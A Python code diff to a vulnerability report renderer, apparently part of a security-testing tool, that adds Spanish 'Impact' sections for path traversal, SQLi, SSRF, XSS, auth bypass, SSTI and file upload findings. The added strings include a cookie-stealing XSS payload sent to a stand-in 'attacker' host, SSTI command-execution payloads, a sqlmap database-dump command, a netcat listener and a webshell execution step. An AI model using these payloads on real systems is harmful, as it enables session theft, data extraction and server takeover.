@@ -3583,9 +3583,14 @@ def render_investigation_page(markdown: str, script: str = "", cve: str = "targe
                 (("Resultado esperado" if es else "Expected result"),
                  (f"La respuesta contiene '{_can_r}' — lectura de fichero fuera del webroot confirmada."
                   if _can_r else "El contenido del fichero objetivo aparece en la respuesta.")),
+                (("Impacto" if es else "Impact"),
+                 "Lectura arbitraria de ficheros fuera del directorio web.\n"
+                 "El atacante puede leer /etc/passwd, claves privadas SSH (~/.ssh/id_rsa),\n"
+                 "credenciales de base de datos (.env, wp-config.php), tokens de sesión."),
             ]
         elif any(x in _vc_r for x in ("sqli", "sql")):
             _mysql_ver = str(verified_ev.get("mysql_version_extraida") or "")
+            _auth_req  = str(verified_ev.get("login_bajo_privilegio") or "")
             _repro_steps = [
                 (("1 · Enviar la petición con el payload SQLi" if es else "1 · Send the SQLi request"),
                  " ".join(_curl_parts)),
@@ -3593,53 +3598,93 @@ def render_investigation_page(markdown: str, script: str = "", cve: str = "targe
                  (f"grep -i 'version\\|mysql\\|xpath\\|~{_mysql_ver}' -" if _mysql_ver else
                   "# Busca el error SQL o el canal de extracción en la respuesta")),
                 (("Resultado esperado" if es else "Expected result"),
-                 (f"La respuesta contiene la version MySQL: {_mysql_ver}" if _mysql_ver else
-                  "Error SQL o diferencia en la respuesta confirma la inyeccion.")),
+                 (f"Respuesta contiene versión MySQL: {_mysql_ver}" if _mysql_ver else
+                  "Error SQL o diferencia de respuesta confirma la inyección.")),
+                (("Impacto" if es else "Impact"),
+                 ("Sin autenticación, el atacante extrae datos de cualquier tabla (wp_users, contraseñas, emails).\n"
+                  if not _auth_req else
+                  f"Con credencial mínima ({_auth_req}), el atacante extrae datos de cualquier tabla.\n")
+                 + "Con sqlmap: `sqlmap -u \"URL\" --dump --tables -D wordpress`\n"
+                 + "Extracción completa de la BD, incluyendo hashes de contraseñas de administradores."),
             ]
         elif any(x in _vc_r for x in ("ssrf",)):
+            _ssrf_cb   = str(verified_ev.get("callback_url_ganadora") or "")
+            _ssrf_tok  = str(verified_ev.get("token_ganador") or _can_r)
             _repro_steps = [
                 (("1 · Levantar listener de callback" if es else "1 · Start callback listener"),
-                 "# En el laboratorio Docker se levanta un listener interno automáticamente"),
+                 "# netcat o servidor HTTP controlado por el atacante\nnc -lvnp 8080"),
                 (("2 · Enviar la petición SSRF" if es else "2 · Send the SSRF request"),
                  " ".join(_curl_parts)),
                 (("3 · Comprobar el log del listener" if es else "3 · Check listener log"),
-                 (f"# Token esperado: {_can_r}" if _can_r else
-                  "# El listener registra la conexión entrante del servidor objetivo")),
+                 (f"# Request recibida con token: {_ssrf_tok}" if _ssrf_tok else
+                  "# El listener registra la conexión HTTP del servidor objetivo")),
+                (("Impacto" if es else "Impact"),
+                 "El servidor hace peticiones HTTP arbitrarias a hosts internos no expuestos.\n"
+                 "Enumeración de servicios internos (169.254.169.254 metadata, Redis, Elasticsearch).\n"
+                 "En clouds: exfiltración de credenciales IAM desde el endpoint de metadatos."),
             ]
         elif any(x in _vc_r for x in ("xss",)):
             _xss_m = str(verified_ev.get("xss_marker") or "")
+            _xss_stored = "stored" in _vc_r or "almacenado" in _vc_r
             _repro_steps = [
-                (("1 · Enviar la petición con el payload XSS" if es else "1 · Send the XSS request"),
+                (("1 · Enviar el payload XSS" if es else "1 · Send the XSS payload"),
                  " ".join(_curl_parts)),
                 (("2 · Comprobar la respuesta" if es else "2 · Check the response"),
                  (f"grep -i '{_xss_m}' -" if _xss_m else "# El marcador XSS aparece en la respuesta sin sanitizar")),
+                (("Impacto" if es else "Impact"),
+                 ("XSS almacenado: el payload se ejecuta en el navegador de cualquier usuario que visite la página.\n"
+                  if _xss_stored else
+                  "XSS reflejado: el payload se ejecuta en el navegador de la víctima si visita el enlace.\n")
+                 + "El atacante puede robar cookies de sesión, redirigir al usuario, capturar keystrokes.\n"
+                 + "Payload de robo de cookies: <script>document.location='http://attacker/?c='+document.cookie</script>"),
             ]
-        elif any(x in _vc_r for x in ("auth", "bypass", "missing-auth")):
+        elif any(x in _vc_r for x in ("auth", "bypass", "missing-auth", "authorization")):
+            _bypass_ep = str(verified_ev.get("endpoint") or _ep_r)
             _repro_steps = [
                 (("1 · Enviar la petición sin autenticación" if es else "1 · Send the request without authentication"),
                  " ".join(_curl_parts)),
                 (("Resultado esperado" if es else "Expected result"),
-                 "HTTP 200 con contenido restringido — la autenticación no se aplica."),
+                 f"HTTP 200 — acceso al recurso restringido {_bypass_ep} sin credenciales."),
+                (("Impacto" if es else "Impact"),
+                 "Acceso no autorizado a funcionalidad restringida (panel admin, API privada, datos de usuarios).\n"
+                 "Dependiendo del endpoint: escalada de privilegios, modificación de datos, account-takeover.\n"
+                 "Sin autenticación necesaria: cualquier usuario anónimo en internet puede explotarlo."),
             ]
         elif any(x in _vc_r for x in ("ssti", "template")):
             _ssti_p = str(verified_ev.get("ssti_param") or _pk_r)
             _repro_steps = [
-                (("1 · Enviar la petición con el payload SSTI" if es else "1 · Send the SSTI request"),
+                (("1 · Confirmar SSTI (expresión matemática)" if es else "1 · Confirm SSTI (math expression)"),
+                 " ".join(_curl_parts).replace(_pl_r, "{{7*7}}") if _pl_r else " ".join(_curl_parts)),
+                (("2 · Enviar payload real" if es else "2 · Send real payload"),
                  " ".join(_curl_parts)),
                 (("Resultado esperado" if es else "Expected result"),
-                 "La expresión de plantilla se evalúa en el servidor — resultado aparece en la respuesta."),
+                 "La expresión de plantilla se evalúa — el resultado aparece en la respuesta."),
+                (("Impacto" if es else "Impact"),
+                 "SSTI permite ejecutar código arbitrario en el servidor.\n"
+                 "Jinja2: {{ ''.__class__.__mro__[1].__subclasses__()[...].popen('id').read() }}\n"
+                 "Twig: {{['id']|filter('system')}}\n"
+                 "El atacante puede ejecutar comandos, leer ficheros, rotar a RCE completo."),
             ]
         elif any(x in _vc_r for x in ("upload", "file")):
             _repro_steps = [
                 (("1 · Subir el webshell" if es else "1 · Upload the webshell"),
                  " ".join(_curl_parts)),
                 (("2 · Ejecutar el webshell" if es else "2 · Execute the webshell"),
-                 "# Accede a la URL donde se subió el archivo para ejecutar el payload"),
+                 f"curl -s '{_url_r.rsplit('/',1)[0]}/shell.php?cmd=id'"),
+                (("Resultado esperado" if es else "Expected result"),
+                 "uid=33(www-data) gid=33(www-data) — ejecución de comandos confirmada."),
+                (("Impacto" if es else "Impact"),
+                 "Subida de webshell PHP sin restricción → ejecución de comandos arbitrarios.\n"
+                 "El atacante obtiene acceso completo al servidor web con privilegios del proceso.\n"
+                 "Puede leer la base de datos, escalar privilegios, establecer persistencia."),
             ]
         else:
             _repro_steps = [
                 (("1 · Enviar la petición" if es else "1 · Send the request"),
                  " ".join(_curl_parts)),
+                (("Impacto" if es else "Impact"),
+                 f"Vulnerabilidad {_vc_r} confirmada en {_ep_r}.\n"
+                 "Consultar el informe completo para el análisis de impacto detallado."),
             ]
 
         if _repro_steps:
